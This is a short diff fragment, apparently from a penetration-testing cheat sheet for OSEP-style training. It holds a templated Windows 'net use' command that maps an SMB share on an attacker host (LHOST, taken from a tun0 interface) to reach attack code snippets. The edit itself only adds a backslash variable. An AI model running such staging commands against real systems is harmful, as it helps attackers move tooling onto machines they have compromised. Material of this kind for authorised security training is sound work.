@@ -12,3 +12,4 @@ net use <BS><BS><LHOST><BS>share /user:<USER> <PASS>
 <BS><BS><LHOST><BS>share<BS>OSEP-Code-Snippets<BS><ATTACK_TYPE>
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+$ BS: echo '\'
